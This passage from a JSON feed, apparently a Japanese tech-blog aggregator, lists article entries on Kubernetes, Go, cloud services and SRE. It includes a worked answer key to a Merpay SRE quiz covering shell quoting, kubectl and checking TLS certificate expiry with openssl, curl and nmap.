広樹","authorId":"hiroki-hasegawa"},{"title":"Kube API Serverの内部実装を解説する技術同人誌を技術書典11で出しました!","link":"https://bells17.medium.com/wrote-the-kube-api-server-book-2155129db374?source=rss-713cf42ce34d------2","isoDate":"2021-07-19T09:16:43.000Z","dateMiliSeconds":1626686203000,"authorName":"bells17","authorId":"bells17"},{"title":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについて","link":"https://zenn.dev/nnaka2992/articles/1fa7fb5d03f958","contentSnippet":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについてTable of ContentsOracleインストール中にでたSysctl系エラーであたったkernel parameterについてMotivationそもそもsysctlとは何なのか？Oracleセットアップ中に遭遇したkernel parameterssemopm変更方法セマフォ(semaphore)とは？SEMSMLSEMMNSSEMOPMSEMMNIfile-max変更方法rem_default/rem_max/...","isoDate":"2021-07-11T08:41:03.000Z","dateMiliSeconds":1625992863000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Isn’t it troublesome to set the log file in python? Use LoggerGenerator","link":"https://daisuke1024akagawa.medium.com/isnt-it-troublesome-to-set-the-log-file-in-python-use-loggergenerator-8e6483843bd3?source=rss-c54ac439ad2b------2","isoDate":"2021-06-30T06:06:24.000Z","dateMiliSeconds":1625033184000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"\uD83E\uDD1D\uD83C\uDFFB 依存関係と依存オブジェクト注入","link":"https://speakerdeck.com/hiroki_hasegawa/yi-cun-guan-xi-toyi-cun-obuziekutozhu-ru","contentSnippet":"社内LTにて、依存関係と依存オブジェクト注入を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（ドメイン駆動設計と依存性逆転の原則）：\\rhttps://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","isoDate":"2021-06-25T04:00:00.000Z","dateMiliSeconds":1624593600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Kustomize でスラッシュを含むパスにパッチを当てる","link":"https://zenn.dev/toshikish/articles/38896bb9ae1913","contentSnippet":"背景Kustomize では JSON Patch を用いて base のマニフェストにパッチを当てることができます。例えば，以下のマニフェストdeployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app.kubernetes.io/name: myapp    app.kubernetes.io/version: v1.0.0    name: myapp    version: v1.0.0...の version の値を v1.0.1 に変えたい場合は，以下の...","isoDate":"2021-05-31T07:34:24.000Z","dateMiliSeconds":1622446464000,"authorName":"toshikish","authorId":"toshikish"},{"title":"\uD83D\uDC2D Goに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/goniru-men-siyou","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-27T04:00:00.000Z","dateMiliSeconds":1622088000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"♾️ SREに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","contentSnippet":"社内LTにて、SRE用語を布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-07T04:00:00.000Z","dateMiliSeconds":1620360000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"\uD83D\uDC2D Lambda関数をGoで実装してみた話","link":"https://speakerdeck.com/hiroki_hasegawa/lambdaguan-shu-wogodeshi-zhuang-sitemitahua","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-03-26T04:00:00.000Z","dateMiliSeconds":1616731200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"VolumePluginの仕組みと実装解説","link":"https://speakerdeck.com/kyohmizu/volumepluginfalseshi-zu-mitoshi-zhuang-jie-shuo","contentSnippet":"勉強会の資料です。\\rhttps://k8sinternal.connpass.com/event/203946/","isoDate":"2021-02-22T05:00:00.000Z","dateMiliSeconds":1613970000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"July Tech Festa 2021 winterで発表&運営スタッフをしました","link":"https://bells17.medium.com/july-tech-festa-2021-winter%E3%81%A7%E7%99%BA%E8%A1%A8-%E9%81%8B%E5%96%B6%E3%82%B9%E3%82%BF%E3%83%83%E3%83%95%E3%82%92%E3%81%97%E3%81%BE%E3%81%97%E3%81%9F-385e7e18aac4?source=rss-713cf42ce34d------2","isoDate":"2021-01-26T04:26:28.000Z","dateMiliSeconds":1611635188000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS ソリューションアーキテクト アソシエート合格までのまとめ","link":"https://qiita.com/dirtymosschan/items/da3eebdf6b7be9c3eb67","contentSnippet":"目次0. はじめに先日、AWS ソリューションアーキテクト アソシエート に合格したので、忘れないうちに色々とアウトプットしておこうと思います。これから受験を考えている方の役にたてればと思います。どんな人間がどのくらいの時間をかけて取得したのかを説明するために、少...","isoDate":"2021-01-19T13:11:47.000Z","dateMiliSeconds":1611061907000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"2020年にKubernetse関連で取り組んだことまとめ","link":"https://bells17.medium.com/2020-kubernetse-4771e660a174?source=rss-713cf42ce34d------2","isoDate":"2020-12-23T16:04:00.000Z","dateMiliSeconds":1608739440000,"authorName":"bells17","authorId":"bells17"},{"title":"GCP の Identity Aware-Proxy を使って SSH した話","link":"https://qiita.com/dirtymosschan/items/fd11001daa68d7c8d943","contentSnippet":"Cloud Identity Aware-Proxy とは？一言で表すと、Google のアカウントを使ってセキュアにリソースに接続できるプロキシサービスです。何ができる？GCP 上の VM に対して、アクセス制御を行うことができるGoogle アカウントの ...","isoDate":"2020-12-22T11:20:18.000Z","dateMiliSeconds":1608636018000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"gRPC-WebとGoとVue.jsで簡素なチャット","link":"https://qiita.com/atsuya0/items/f994ca9d820d307daffd","contentSnippet":"はじめに何だか良くわからないけどよく聞くgRPC-Webなるものを触りだけでも理解すべく辛うじてチャット呼べそうなものを作ってみました。概要gRPCとはhttps://grpc.io/Protocol BuffersやHTTP2などを利用した環境に依存せず...","isoDate":"2020-12-17T17:06:43.000Z","dateMiliSeconds":1608224803000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"VolumePlugin がボリュームを作成・マウントするしくみ","link":"https://qiita.com/kyohmizu/items/40bee7037e1ce7949772","contentSnippet":"はじめにPod の作成時、pod.spec.volumes に記述したボリュームがコンテナにマウントされます。マウントされる Node 側のボリュームを、VolumePlugin がどのように作成・マウントしているのか調べました。機能VolumePlugin は...","isoDate":"2020-12-17T10:54:47.000Z","dateMiliSeconds":1608202487000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Sidekiqのジョブをパフォーマンスを考えて削除する","link":"https://qiita.com/atsuya0/items/30d6259766a9a0d5103d","contentSnippet":"はじめにRailsで処理を何らかの理由で遅延させた場合や非同期に処理を行いたいときに多くの人がActive Jobを使用していると思います。とても便利で良いやつなのですがキューに積んだジョブを削除しようとするとたちまち暗雲が立ち込めます。前提アダプタは記事のタイ...","isoDate":"2020-12-12T17:37:05.000Z","dateMiliSeconds":1607794625000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"任意のファイルをPNGファイルで隠してみる","link":"https://qiita.com/atsuya0/items/a8ccbc9637c37cdf967e","contentSnippet":"はじめにある日、私はファイルを連結したらどうなるんだろうという好奇心に逆らえず、おもむろに連結して確かめてみることにしました。結果、その連結したファイルは普通にファイルとして使えることがわかりました。ファイルを読み込むシステムによるとは思いますが、後ろのファイルはた...","isoDate":"2020-12-12T14:56:30.000Z","dateMiliSeconds":1607784990000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Kubernetes Internal #1を開催しました","link":"https://bells17.medium.com/kubernetes-internal-1-ea0f1adcfe33?source=rss-713cf42ce34d------2","isoDate":"2020-10-19T10:29:31.000Z","dateMiliSeconds":1603103371000,"authorName":"bells17","authorId":"bells17"},{"title":"Istio の timeout, retry, circuit breaking, etc","link":"https://medium.com/@yteraoka/istio-%E3%81%AE-timeout-retry-circuit-breaking-etc-c170285447e8?source=rss-8b55af126a13------2","isoDate":"2020-10-17T14:52:08.000Z","dateMiliSeconds":1602946328000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS CDK on Scala ~ Scalaでインフラ管理してみたはなし / Manage infrastructure with AWS CDK on Scala","link":"https://speakerdeck.com/nomadblacky/manage-infrastructure-with-aws-cdk-on-scala","contentSnippet":"https://scala-tokyo.connpass.com/event/187140/","isoDate":"2020-09-25T04:00:00.000Z","dateMiliSeconds":1601006400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"kubeadmの共通処理の実装","link":"https://bells17.medium.com/kubeadm-common-implementation-a5e5b3890dde?source=rss-713cf42ce34d------2","isoDate":"2020-09-12T19:22:01.000Z","dateMiliSeconds":1599938521000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes (k8s) 管理者用GUI Lens","link":"https://qiita.com/tozastation/items/804949c69df5d53643c6","contentSnippet":"Lensとはlensapp/lensk8sで動作する全てのリソースをモニタリングしてくれるGUIアプリLinux/Mac/Windowsで動作するこんな感じ（kindで作ったクラスタ見てます）助かりポイントリソース（Pod/Namespace/C...","isoDate":"2020-09-07T12:53:18.000Z","dateMiliSeconds":1599483198000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Slinky で Scala.js 製 React Webアプリケーションを つくったはなし / How to build a Scala.js React web application in Slinky","link":"https://speakerdeck.com/nomadblacky/how-to-build-a-scala-dot-js-react-web-application-in-slinky","contentSnippet":"Scala.js 向けの React フレームワークである Slinky でWebアプリケーションを作成したはなし","isoDate":"2020-08-30T04:00:00.000Z","dateMiliSeconds":1598760000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Cloud SQLへのprivate ip 接続でハマった話","link":"https://qiita.com/SatohJohn/items/e79f363798a6233f9ad2","contentSnippet":"概要Cloud SQL(MySQL)に対してprivate ipを使ってアクセスしたときに、何をチェックしたかをメモするハマったからにはきちんとログを残す現象GCE から Cloud SQLに対してprivate ipでアクセスができない$ mysql -u ...","isoDate":"2020-08-07T16:53:50.000Z","dateMiliSeconds":1596819230000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"情報処理安全確保支援士の関連資料","link":"https://kyohmizu.hatenablog.com/entry/2020/08/05/115459","contentSnippet":"情報処理安全確保支援士の業務を行う上で、参照すべき資料一覧です。サイバーセキュリティ基本法（平成二十六年法律第百四号）情報処理の促進に関する法律（昭和四十五年法律第九十号）情報処理学会倫理綱領RFC:1087 倫理とインターネット(Ethics and the Internet)セキュリティ対応組織 (SOC,CSIRT)強化に向けたサイバーセキュリティ情報共有の「5W1H」 v2.0 (2019年4月)JPCERT インシデントハンドリングマニュアルIPA 脆弱性対策の効果的な進め方（ツール活用編）情報セキュリティ早期警戒パートナーシップガイドラインIPA 重要なセキュリティ情報一覧IPA 共通脆弱性評価システムCVSS v3概説JVN (Japan Vulnerability Notes)JVN 脆弱性レポートの読み方JVN iPediaFIRST Common Vulnerability Scoring System SIGCWE (Common Weakness Enumeration)IPA 脆弱性体験学習ツール AppGoatMyJVNIPA 組織における内部不正防止ガイドライン地方公共団体における情報セキュリティポリシーに関するガイドライン(平成30年9月版)IPA 委託関係における情報セキュリティ対策ガイドラインIPA 中小企業の情報セキュリティ対策ガイドラインIPA 情報漏えい対策のしおりNISC スマートフォン等の業務利用における情報セキュリティ対策の実施手順作成手引書個人情報の保護に関する法律についてのガイドラインIPA 企業(組織)における最低限の情報セキュリティ対策のしおりスマートフォンのセキュリティ＜危険回避＞対策のしおりJPCERT/CC 技術メモ - 安全な Web ブラウザの使い方IPA ウェブブラウザのプロテクションプロファイル","isoDate":"2020-08-05T02:54:59.000Z","dateMiliSeconds":1596596099000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"AWS CodeBuild において オンプレのJenkins では成功していたファイル権限系のテストをするとうまくいかない","link":"https://qiita.com/tayakun/items/6b721985bc098dda9846","contentSnippet":"この記事を書くに至った経緯私が開発しているチームでは、Jenkinsでビルド・テストを行っていました。色々と環境をAWSに載せ替えていく中で、AWS CodeBuildを使用することになりました。ところが、ReadOnlyに設定したファイルにWriteできないことを...","isoDate":"2020-06-22T15:15:05.000Z","dateMiliSeconds":1592838905000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Mac VScode Maven でJunit 使ってみた","link":"https://qiita.com/tayakun/items/16201aa0371fa874ec78","contentSnippet":"はじめにとりあえずVSCodeでJUnit使ってユニットテスト体験してみたい人が対象です。まだJavaすらMacに入れてないんだ！って人はこちらを参考にしてみてください。動作環境macOS : Catalina 10.15.5VSCode : 1.46.1...","isoDate":"2020-06-19T18:23:53.000Z","dateMiliSeconds":1592591033000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Handy Admission Webhook Library","link":"https://qiita.com/toVersus/items/5316e94490d60c220af7","contentSnippet":"Kubernetes の Admission Webhook を開発する際に、kubernetes/api をラップした軽量なライブラリやフレームワークを使うことがあると思います。kubernetes-sigs/controller-runtimeslok/kubew...","isoDate":"2020-06-14T05:05:07.000Z","dateMiliSeconds":1592111107000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Mac VSCode JavaでHelloWorldした","link":"https://qiita.com/tayakun/items/a38386288c50233c6a90","contentSnippet":"はじめにタイトル通り、ただHelloWorldするだけです。よくある標準出力するだけの課題とかをささっとすますにはいいかもしれません。今からこの環境でWebアプリとか作っちゃうんだ！って人にはお勧めしません。他にIntelliJ IDEA, Eclipse + P...","isoDate":"2020-06-10T14:57:49.000Z","dateMiliSeconds":1591801069000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Chaos Mesh によるカオスエンジニアリング","link":"https://medium.com/@yteraoka/chaos-mesh-%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%82%AA%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0-46fa2897c742?source=rss-8b55af126a13------2","isoDate":"2020-06-02T03:16:16.000Z","dateMiliSeconds":1591067776000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub ActionsからGAEにdeployする際のsecretの扱い","link":"https://qiita.com/SatohJohn/items/2341168ccb93c5e144ab","contentSnippet":"概要この記事の内容としては以下の通りGAEのapp.yamlが環境変数を読み取らないので、値をなんとか渡す方法。GitHubActionsで認証ファイルを扱う方法。ユースケースとして、GAEにGitHub Actionsを使ってdeployしたいGAEのアプ...","isoDate":"2020-05-13T08:20:51.000Z","dateMiliSeconds":1589358051000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"3月末日で退職してました","link":"https://blog.masasuzu.net/entry/2020/04/12/134300","contentSnippet":"株式会社モバイルファクトリーを3/31で退職してました。2010年6月入社なので9年10ヶ月になりますね。今は新しい会社のSREチームで働いています。前半数年間はケータイ向けのサイト(いわゆる着メロサイト)やソーシャルアプリの開発運用をしていました。後半数年間は社内全体の開発基盤・運用基盤の整備をしていました。いわゆるインフラよりのお仕事ですね。入社当時Webアプリケーション開発をまったく分かってなかったところからなんとか人並みに運用開発できる力をこの会社で身につけることが出来たと思います。今なんとかwebエンジニアをやれてるのはこの会社のおかげと言っても過言では無いと思っています。入社当時SQLをまともに書けなかったくらいのレベルだったのでよく採用されたなと。。。お仕事的には回りのレベルも高いし、自身の仕事のやり方も裁量を与えられていたし、社内環境も、待遇も悪くなかった。むしろ良かったくらいでした。ただ、長年勤めていく内に悪い意味での慣れが出てきて、自分自身停滞感を感じることが出てきました。ここ数年が特に感じることが多く、停滞感から来る焦りを日々感じていました。どうにか停滞感を解消するために副業として他社のお仕事を請け負ったりしていましたが、どうにも解消ができずにいました。そんな折に現職のSREチームの話をいただきました。実際に面談、面接を受けて、課題や環境の話を聞くにつれて、ここでなら一歩進めるのではないかという感触を得ました。もちろん焦燥感、停滞感はあれど、居心地が良いと感じてた今までの環境を変えることにはかなりの葛藤がありました。いろんな決め手はあったのですが、新しい場所の方が一番の下手*1でいれそう、なにより事業的にも業務的にも仲間的にもワクワクできそうというあたりが決定打になりました。入社して2週間しかも、初日以外ずっと在宅勤務なのでまだ様子が摑めてないですが、早くキャッチアップしてバリバリ成果を出していきたい所存です。これからもよろしくお願いします。例のもの置いておきます。気が向いたらでよいです。https://www.amazon.jp/hz/wishlist/ls/3S4C1LCDWKCTM?ref_=wl_share*1:情熱プログラマ参照","isoDate":"2020-04-12T04:43:00.000Z","dateMiliSeconds":1586666580000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"IAPに対応しているGAEにアクセスする","link":"https://qiita.com/SatohJohn/items/d21d8487f55ed911e687","contentSnippet":"概要GCPにあるGAEに対してアクセスする場合、認証のためにIAPをつけることが多いハズその際にrequest clientに対して認証情報を付ける方法についてまとめるサービスアカウントを作るサービスアカウントは以下の通りに作成できるhttps://cloud...","isoDate":"2020-03-29T12:12:15.000Z","dateMiliSeconds":1585483935000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Vuetify.jsのリンクの違いについて","link":"https://qiita.com/SatohJohn/items/881d9a6fceceda1c1ce7","contentSnippet":"概要vuetifyのbuttonやlist-itemなどに対してnuxt linkをつける際にリンクの付け方は2つあるhreftoどう使い分けるかというと、 https://qiita.com/white0221/items/ad4136cf2b80eda25...","isoDate":"2020-03-22T11:06:18.000Z","dateMiliSeconds":1584875178000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"圏論とコンピュータサイエンス / Category Theory and Theoretical Computer Science","link":"https://speakerdeck.com/yunosukey/category-theory-and-theoretical-computer-science","contentSnippet":"","isoDate":"2020-03-09T04:00:00.000Z","dateMiliSeconds":1583726400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Merpay SRE Quiz @SRE Next 2020 解答・解説","link":"https://toshikish.hateblo.jp/entry/2020/02/11/024400","contentSnippet":"これは何？2020年1月25日に行われた SRE NEXT 2020 で，メルペイさんがブースで出していた SRE に関するクイズです。正答数で景品がもらえたようです。3問以上：メルペイキーキャップ4問以上：メルペイキーキャップ＋メルペイ SRE が推薦する本今日は SRE NEXT に来ています！ブース出してます！メルペイSREが考えたクイズに挑戦してみてください！#srenext pic.twitter.com/sQmndWucrP— Mercari_Dev (@mercaridevjp) January 25, 2020 メルペイ SRE が推薦する本って？ツイートのスレッドをたどっていくと，ラインナップは以下のようでした。『入門 監視』『詳解 シェルスクリプト』『Kubernetes 完全ガイド』『Programming Kubernetes』『パケットキャプチャの教科書』『プロダクションレディ マイクロサービス』『Linux カーネル Hacks』『エンジニアリング組織論への招待』『エンジニアのためのマネジメントキャリアパス』名著ばかりですね。第1問 SLO とはなんの略でしょうか？選択肢Service Level Observability (サービスレベル可観測性)Service Level Objective (サービスレベル目標)System Level Observability (システムレベル可観測性)System Level Objective (システムレベル目標)正解Service Level Objective (サービスレベル目標)解説SRE 本の Chapter 4 - Service Level Objectives に書かれている定義は以下のとおりです。An SLO is a service level objective: a target value or range of values for a service level that is measured by an SLI.SLI（サービスレベル指標）の目標値または値の範囲を SLO（サービスレベル目標）といいます。第2問 ユーザーが所属しているユーザーグループを知るためのコマンドはどれか？選択肢idwhoamiwholsgroup正解id解説明示されていないですが，UNIX 系 OS のコマンドを前提としていますね。id：ユーザー情報を表示するコマンドで，ユーザー情報（ID，名前）とグループ情報（ID，名前）が表示されます。実行例：foobar@darkstar:~$ iduid=1016(foobar) gid=100(users) groups=100(users)whoami：実行ユーザーの ID を表示するコマンドです。id -un と等価です。who：実行ユーザーの情報（名前，プロセス，起動時刻など）を表示するコマンドです。lsgroup：グループの属性を表示する AIX（IBM の UNIX 系 OS）のコマンドです。デフォルトパラメータがないので，グループを指定するか ALL を指定する必要があります。これらのうち，ユーザーの所属グループが表示されるのは id コマンドです。第3問 $ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\" の出力結果はどれか？選択肢33 2 1error1正解3 2 1解説bash -c string：string が bash で実行されます。echo message：message と改行を出力します。パイプ |：コマンドの出力を次のコマンドの標準入力に渡します。ここでは，3 2 1\\\\n を awk コマンドの標準入力に渡します。awk \'パターン {アクション}\'：AWK のコマンドで，入力に対してパターンにマッチしたものにアクションを適用します。パターンを省略（空パターン）すると，全パターンにマッチする扱いになります。$ bash -c \\"... $1 ...\\"：\\"\\" で囲まれた$ は展開されます。1 という変数名は定義されていないので，$1 が展開されると空文字になります。AWK に伝わるスクリプトは \'{print }\' になり，全パターンに対してそのまま出力する挙動になります。したがって，$ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\"3 2 1となります。ちなみに，1番目のフィールドを表示させたい場合は，$ が展開されないように \\\\$ とエスケープします。$ bash -c \\"echo 3 2 1 | awk \'{print \\\\$1}\'\\"3bash -c \\"...\\" を噛まさなければ，シングルクォート \'\' で囲まれた $ が展開されず，意図通りの挙動になります。$ echo 3 2 1 | awk \'{print $1}\'3エスケープ・展開絡みの落とし穴を題材にした問題ですね。調べてみたら複数事例見つかり，ハマりポイントのようです。stackoverflow.comteratail.com第4問 DNS が使用するポート番号は何番ですか？選択肢225380443正解53解説すべて well-known ポート番号です。22：SSH53：DNS80：HTTP443：HTTPS第5問 Kubernetes の Deployment の Event を見られるコマンドは，以下のうちどれか？選択肢kubectl describe <Deployment Name>kubectl logs -l <Deployment Label>kubectl get deployment <Deployment Name> -o yamlkubectl logs <Deployment Name>正解kubectl describe <Deployment Name>解説kubectl describe：リソースの詳細な情報を出力します。Events: セクションにイベント情報が表示されます。kubectl get events コマンドで全リソースのイベントを表示することができます。kubectl logs：コンテナのログを出力します。--selector (-l) オプションで結果にフィルタをかけることができます。kubectl get：リソースの基本的な情報を取得します。kubectl get deployment <Deployment Name> -o yaml とすると，Deployment の定義を YAML 形式で出力します。kubectl describe コマンドの引数で Deployment の名称を指定すると，その Deployment に関連したイベントを取得できるので，kubectl describe <Deployment Name> が正解です。第6問 Web サイトに設定している TLS 証明書の有効期限を確認できるコマンドは以下のうちどれか？選択肢openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep Aftercurl --tlsv1.2 -l https://www.merpay.com | grep Expirewget --no-check-certificate https://www.merpay.com | grep Certnmap --script ssl-enum-ciphers -p 443 www.merpay.com | grep Date正解openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep After解説openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text：OpenSSL の SSL/TLS クライアントで指定されたホストに接続して証明書を取得し，x509 サブコマンドで証明書情報を取り出します。Not After : で始まる行に有効期限が書かれるので，grep で取り出せます。-text オプションの代わりに -dates オプションを指定すると，証明書の開始日と失効日だけが出力されます。curl --tlsv1.2 -l https://www.merpay.com：Response Body（ここでは HTML）が出力されます。TLS 証明書の情報は含まれません。wget --no-check-certificate https://www.merpay.com：指定した URL の内容を証明書の検証をせずにダウンロードしてファイル（ここでは index.html）に保存します。標準出力にはリクエストの実行ログが吐かれますが，TLS 証明書の情報は含まれません。nmap --script ssl-enum-ciphers -p 443 www.merpay.com：Nmap を用い，指定されたホストに対して SSL/TLS の暗号・圧縮方式を複数試行した結果を出力します。証明書の有効期限の情報は含まれません。実行例：PORT    STATE SERVICE REASON443/tcp open  https   syn-ack| ssl-enum-ciphers:|   TLSv1.0:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|       Weak certificate signature: SHA1|   TLSv1.2:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|_  least strength: CcURL，Nmap で実現する例は以下のとおりです。curl --tlsv1.2 -v https://www.merpay.com 2>&1 | grep expirenmap --script ssl-cert -p 443 www.merpay.com | grep afterserverfault.com感想骨のある問題が多いです。1，4を確実に正解して，その他をどれだけ正解できるかといった感じでしょうか。知らなければ調べればいい話ですが，業務でよく使うコマンドなら覚えておいて手足のように使いこなせるほうが望ましいでしょう。","isoDate":"2020-02-10T17:44:00.000Z","dateMiliSeconds":1581356640000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2019年のふりかえり、2020年の目標","link":"https://kyohmizu.hatenablog.com/entry/2020/02/01/040351","contentSnippet":"すでに年が明けて1ヶ月経ちましたが、2019年の活動を振り返ろうと思います。Kubernetes、Cloud Native技術を中心に学習を進めました。勉強会、カンファレンス1月Cloud Native Meetup Tokyo #6 KubeCon + CNCon RecapKubernetes Meetup Tokyo #15 - KubeCon 2018 RecapRancher/Kubernetes勉強会　Kubernetes管理ツールの活用法OWASP Connect in Tokyo #2今回は特別編！Cloud Nativeなアプリ開発から学んだことを全部シェア - cndjp#92月Yahoo! JAPAN MEETUP #31 インフラ技術カンファレンスGo 1.12 Release Party in Tokyo w/ Fukuoka&Umedassmjp 2019/02Docker Meetup Tokyo #28第三回ボトムアップドメイン駆動設計サイバーセキュリティシンポジウム3月k8s source code reading #3Cloud Native Meetup Tokyo #7 @Abema Towers4月Cloud Native Tokyo #01Serverlessについて思いを馳せる一夜 - cndjp第11回勉強会ssmjp 2019/04Rancher k3s もくもく勉強会 #035月レガシーをぶっつぶせ。現場でDDD！ssmjp 2019/05IIJ Technical NIGHT vol.7SRE Lounge #9Docker Meetup Tokyo #30 (DockerCon・KubeConEU報告会)Yahoo! JAPAN MEETUP #32 インフラ技術／Kubernetes6月NoOps Meetup Tokyo #6Kubernetes Meetup Tokyo #20 - KubeCon RecapGCPUG Tokyo Next Extended 2019 Infra DayInteract 20197月恐るることなかれ! Cloud NativeリレーショナルDB特集!! - cndjp第12回第三十五回 Azureもくもく会 @ 品川CloudNative Days Tokyo Meetup w/ Melanie CebulaKubernetes Meetup Tokyo #21 - Cloud Native CI/CDSekkeiKaigiCloud Native Days Tokyo 2019 → スタッフとして参加8月SRE Lounge #10CloudNative Days Tokyo 2019振り返りNightGo 1.13 Release Party in TokyoKubernetes Meetup Tokyo #229月Docker Meetup Tokyo #32Japan Azure User Group 9周年イベントXP祭り2019golang.tokyo #26Cloud Native Meetup Tokyo #10Kubernetes Meetup Tokyo #23 - Operator Deep Dive10月Terraform meetup tokyo#2Kubernetes Meetup Tokyo #24SRE Lounge #1111月さくらの夕べDocker/Kubernetesナイト #2Go Release 10 Year Anniversary Party in Tokyoゴリラ.vim #10 非公式VimConf後夜祭 girls.vimと合同開催技術書典8 はじめてのサークル参加meetupMicrosoft Open Tech Night #1 - インフラ編+Ignite速報俺たちの最適なCloud Nativeを求めて…。本気のこと始め！ - cndjp第13回12月Japan Rook Meetup #1Cloud Native Meetup Tokyo #11 KubeCon RecapGDG DevFest Tokyo 2019Microsoft Open Tech Night #3 - クラウドネイティブ編登壇資料speakerdeck.comspeakerdeck.comspeakerdeck.com書籍商業誌Kubernetes完全ガイドしくみがわかるKubernetesみんなのDocker/KubernetesKubernetes実践入門情報処理安全確保支援士 教科書みんなのGo言語インフラエンジニアの教科書Linuxのしくみ分散システムデザインパターン入門監視Linux教科書 